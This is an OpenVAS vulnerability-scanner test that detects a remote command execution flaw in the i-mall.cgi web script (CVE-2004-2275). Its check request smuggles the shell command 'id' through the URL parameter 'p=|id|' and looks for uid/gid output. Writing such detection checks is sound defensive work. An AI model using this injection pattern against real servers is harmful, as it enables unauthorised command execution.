# OpenVAS Vulnerability Test
# $Id: i-mall_cgi.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: i-mall.cgi
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: ZetaLabs, Zone-H Laboratories

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.15750");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_cve_id("CVE-2004-2275");
 script_bugtraq_id(10626);
 script_xref(name:"OSVDB", value:"7461");
 
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("i-mall.cgi");
 
 
 script_category(ACT_GATHER_INFO);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2004 David Maciejak");
 script_family("Web application abuses");
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_tag(name:"solution", value:"None at this time.");
 script_tag(name:"summary", value:"The script i-mall.cgi is installed.  Some versions of this script are
vulnerable to remote command exacution flaw, due to insuficient user
input sanitization.  A malicious user can pass arbitrary shell commands
on the remote server through this script.");
 exit(0);
}

# The script code starts here
include("http_func.inc");
include("http_keepalive.inc");
include('global_settings.inc');


extra_list = make_list ("/i-mall");

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/i-mall.cgi?p=|id|",
			check_result:"uid=[0-9]+.* gid=[0-9]+.*",
			command:"id"
			);
